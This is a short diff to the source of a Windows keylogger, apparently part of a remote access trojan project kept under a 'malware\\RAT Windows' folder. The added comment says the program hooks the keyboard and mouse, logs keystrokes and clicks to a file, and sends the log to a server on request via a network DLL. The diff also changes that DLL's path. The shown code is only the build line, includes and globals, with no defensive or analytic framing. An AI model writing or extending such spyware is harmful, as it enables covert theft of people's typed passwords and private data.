@@ -1,4 +1,16 @@
 //cl /EHsc .\keylogger.cpp /link ws2_32.lib user32.lib /OUT:keylogger.exe
+/*
+
+    uses the network_lib to send and receive data
+    hooks the keyboard and mouse to log keystrokes and mouse clicks
+    logs the keystrokes and mouse clicks to a file
+    sends the log file to the server when requested
+
+    !! will need the  network_lib.dll in the same directory as the executable   !!
+
+    needs debugging
+*/
+
 #include <windows.h>
 #include <psapi.h>
 #include <iostream>
@@ -20,7 +32,7 @@ SendDataFunc send_data;
 RecvDataFunc receive_data;
 RecvDataRawFunc receive_data_raw;
 
-LPCSTR dllPath = "C:\\malware\\RAT Windows\\network_lib.dll";
+LPCSTR dllPath = "network_lib.dll";
 HINSTANCE hDLL;
 
 bool running = true;
